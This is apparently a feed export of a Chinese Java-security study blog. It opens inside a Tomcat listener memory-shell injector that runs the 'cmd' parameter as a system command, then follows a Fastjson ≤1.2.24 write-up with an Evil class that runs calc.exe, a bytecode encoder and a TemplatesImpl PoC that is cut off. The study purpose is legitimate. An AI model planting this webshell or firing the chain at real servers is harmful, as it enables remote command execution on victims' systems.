&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            ServletRequestListener.<span class="built_in">super</span>.requestDestroyed(sre);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="comment">// 获取HTTP协议的Request和Response</span></span><br><span class="line">                <span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) sre.getServletRequest();</span><br><span class="line">                <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> RequestFacade.class.getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="comment">// 获取request</span></span><br><span class="line">                <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) requestField.get(requestFacade);</span><br><span class="line">                    <span class="comment">// 从request中拿response</span></span><br><span class="line">                <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> request.getResponse();</span><br><span class="line"></span><br><span class="line">                response.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">                <span class="type">PrintWriter</span> <span class="variable">printWriter</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">                    <span class="comment">// 获取输出</span></span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">                    <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream));</span><br><span class="line">                    <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                    <span class="keyword">while</span>((line = bufferedReader.readLine())!=<span class="literal">null</span>)&#123;</span><br><span class="line">                        printWriter.write(line);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加到listener list中</span></span><br><span class="line">    standardContext.addApplicationEventListener(servletRequestListener);</span><br><span class="line"></span><br><span class="line">    out.println(<span class="string">&quot;Listener Shell Injection Success&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson漏洞学习</title>
      <link href="/2025/01/02/WebExploit/Java/FastjsonVuln/"/>
      <url>/2025/01/02/WebExploit/Java/FastjsonVuln/</url>
      
        <content type="html"><![CDATA[<h1 id="Fastjson漏洞学习"><a href="#Fastjson漏洞学习" class="headerlink" title="Fastjson漏洞学习"></a>Fastjson漏洞学习</h1><h2 id="字节码加载和TemplatesImpl利用链"><a href="#字节码加载和TemplatesImpl利用链" class="headerlink" title="字节码加载和TemplatesImpl利用链"></a>字节码加载和TemplatesImpl利用链</h2><blockquote><p>Java字节码加载过程</p></blockquote><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/image-20230816221641337.png" alt="img"></p><ul><li><code>ClassLoader#loadClass</code>：从已加载的类缓存、父加载器等位置寻找类，若没有找到，则执行<code>findClass</code></li><li><code>ClassLoader#findClass</code>：根据基础URL指定的方式来加载类字节码，可能来自于本地或者远程的文件</li><li><code>ClassLodaer#defineClass</code>：处理字节码，然后恢复成真正的类</li></ul><blockquote><p>TemplatesImpl利用链</p></blockquote><ul><li>包：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><br></pre></td></tr></table></figure><ul><li>链子</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties()</span><br><span class="line">TemplatesImpl#newTransformer() -&gt;</span><br><span class="line">            TemplatesImpl#getTransletInstance() -&gt;</span><br><span class="line">                TemplatesImpl#defineTransletClasses()-&gt;</span><br><span class="line">                        TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><p>打个断点看下代码，首先调用<code>getOutputProperties</code>，在这个函数中进行了封装，我们需要调用<code>newTransformer</code></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501051005416.png" alt="image-20250102232833296"></p><p>声明TransformerImpl，这里的几个参数都是fastjson payload中声明的null</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501051005818.png" alt="image-20250102233607799"></p><p>跟进，判断<code>_name</code>和<code>_class</code>参数，我们注意到后者为null，然后就实行类加载操作了，获取到类后创建实例</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501051006175.png" alt="image-20250102233822495"></p><p>声明对应的<code>TransletClassLoader</code>实例，然后根据指定的<code>_bytecode</code>加载，其中<code>_class</code>为存储类的数组</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501051006651.png" alt="image-20250102234412045"></p><h2 id="Fastjson使用"><a href="#Fastjson使用" class="headerlink" title="Fastjson使用"></a>Fastjson使用</h2><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>一个实现toString、getter、setter的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;    无参&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, <span class="type">int</span> id)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;    有参&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// getter和setter</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;    getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;    getId&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;    setId&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;    setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们来用Fastjson的来对类进行解析</p><p><code>SerializerFeature.WriteClassName</code>会让输出时打印出<code>@type</code>类名</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UsageDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;1cfh&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonStr</span> <span class="operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(jsonStr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501051006072.png" alt="image-20250103103551565"></p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">json1</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.User\&quot;,\&quot;id\&quot;:1,\&quot;name\&quot;:\&quot;1cfh\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">json2</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;id\&quot;:1,\&quot;name\&quot;:\&quot;1cfh\&quot;&#125;&quot;</span>;</span><br><span class="line">System.out.println(<span class="string">&quot;调用JSON.parseObject(json1):&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;    &quot;</span>+JSON.parseObject(json1));</span><br><span class="line">System.out.println(<span class="string">&quot;\n调用JSON.parseObject(json1,User.class):&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;    &quot;</span>+JSON.parseObject(json1,User.class));</span><br><span class="line">System.out.println(<span class="string">&quot;\n调用JSON.parse(json1):&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;    &quot;</span>+JSON.parse(json1));</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;\n调用JSON.parseObject(json2):&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;    &quot;</span>+JSON.parseObject(json2));</span><br><span class="line">System.out.println(<span class="string">&quot;\n调用JSON.parseObject(json2,User.class):&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;    &quot;</span>+JSON.parseObject(json2,User.class));</span><br><span class="line">System.out.println(<span class="string">&quot;\n调用JSON.parse(json2):&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;    &quot;</span>+JSON.parse(json2));</span><br></pre></td></tr></table></figure><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501051007037.png" alt="image-20250103152633992"></p><h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4><ul><li><p>指定@type时会涉及类对象的创建</p></li><li><p>指定class时也会涉及类对象的创建</p></li><li><p>使用parseObject且不指定class时会走toJSON分支，从而调用getter，最终调用Fastjson的JSON类的toString函数，且打印结果是json格式</p></li><li><p>指定@type时，使用parseObject时指定class和直接使用parse时的返回结果是一个对象，然后打印对象时的格式为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ClassName&#123;filedValue&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="JSON-parseObject-json1"><a href="#JSON-parseObject-json1" class="headerlink" title="JSON.parseObject(json1)"></a>JSON.parseObject(json1)</h4><p>经过调试不难发现，无参构造函数于此处调用</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501051007834.png" alt="image-20250103112449266"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">newInstance:395, Constructor (java.lang.reflect)</span><br><span class="line">createInstance:108, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:570, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:137, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:128, JSON (com.alibaba.fastjson)</span><br><span class="line">parseObject:201, JSON (com.alibaba.fastjson)</span><br><span class="line">main:12, UsageDemo (org.example)</span><br></pre></td></tr></table></figure><ul><li>setter调用：</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501051007384.png" alt="image-20250103153307106"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">setId:67, User (org.example)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:483, Method (java.lang.reflect)</span><br><span class="line">setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:593, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:137, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:128, JSON (com.alibaba.fastjson)</span><br><span class="line">parseObject:201, JSON (com.alibaba.fastjson)</span><br><span class="line">main:12, UsageDemo (org.example)</span><br></pre></td></tr></table></figure><ul><li>getter调用：（要转成JSON String所有要调一下getter）</li></ul><p>首先在toJSON中判断javaObject的类型</p><p>然后通过getFieldValuesMap来获取字段值</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501051007644.png" alt="image-20250103142639950"></p><p>调用getter</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501051007345.png" alt="image-20250103143022525"></p><p><img src="C:\Users\14537\AppData\Roaming\Typora\typora-user-images\image-20250103143100394.png" alt="image-20250103143100394"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">getId:62, User (org.example)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:483, Method (java.lang.reflect)</span><br><span class="line">get:451, FieldInfo (com.alibaba.fastjson.util)</span><br><span class="line">getPropertyValue:114, FieldSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">getFieldValuesMap:439, JavaBeanSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">toJSON:902, JSON (com.alibaba.fastjson)</span><br><span class="line">toJSON:824, JSON (com.alibaba.fastjson)</span><br><span class="line">parseObject:206, JSON (com.alibaba.fastjson)</span><br><span class="line">main:12, UsageDemo (org.example)</span><br></pre></td></tr></table></figure><h4 id="JSON-parseObject-json1-User-class"><a href="#JSON-parseObject-json1-User-class" class="headerlink" title="JSON.parseObject(json1,User.class)"></a>JSON.parseObject(json1,User.class)</h4><p>无参构造函数的堆栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">createInstance:90, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:570, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parseObject:339, JSON (com.alibaba.fastjson)</span><br><span class="line">parseObject:243, JSON (com.alibaba.fastjson)</span><br><span class="line">parseObject:456, JSON (com.alibaba.fastjson)</span><br><span class="line">main:14, UsageDemo (org.example)</span><br></pre></td></tr></table></figure><p>而在指定Class后，相当于直接打印对象了，运行结果和下述代码运行结果一致</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User user = new User(&quot;1cfh&quot;, 1);</span><br><span class="line">System.out.println(user);</span><br></pre></td></tr></table></figure><h4 id="JSON-parse-json1"><a href="#JSON-parse-json1" class="headerlink" title="JSON.parse(json1)"></a>JSON.parse(json1)</h4><p>注意在<code>parseObject</code>中，会检查<code>key</code>值，如果有<code>@type</code>则会进入如下分支，通过词法分析获取<code>@type</code>的值然后<code>loadClass</code></p><p>然后到<code>deserialize</code>中调用对应的<code>createInstance</code></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501051008913.png" alt="image-20250103151822537"></p><h3 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson &lt;&#x3D; 1.2.24"></a>Fastjson &lt;&#x3D; 1.2.24</h3><h4 id="TemplatesImpl链-RCE-（不出网）"><a href="#TemplatesImpl链-RCE-（不出网）" class="headerlink" title="TemplatesImpl链 RCE （不出网）"></a>TemplatesImpl链 RCE （不出网）</h4><p>evil.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.TemplatesImplDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Evil</span> <span class="variable">evil</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>base64编码一下字节</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.TemplatesImplDemo;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理字节码</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 恶意字节码文件地址</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> <span class="string">&quot;E:\\Java_Sec\\FastjsonDemo\\target\\classes\\org\\example\\TemplatesImplDemo\\Evil.class&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="literal">null</span>;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filePath);</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] temp = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> n;</span><br><span class="line">            <span class="comment">// 以byte形式读取文件内容到temp,然后写入到byteArrayOutputStream中</span></span><br><span class="line">            <span class="keyword">while</span>((n = fileInputStream.read(temp))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                byteArrayOutputStream.write(temp, <span class="number">0</span>, n);</span><br><span class="line">            &#125;</span><br><span class="line">            fileInputStream.close();</span><br><span class="line">            byteArrayOutputStream.close();</span><br><span class="line">            buffer = byteArrayOutputStream.toByteArray();</span><br><span class="line">            Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">            <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> encoder.encodeToString(buffer);</span><br><span class="line">            System.out.println(value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_bytecodes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span 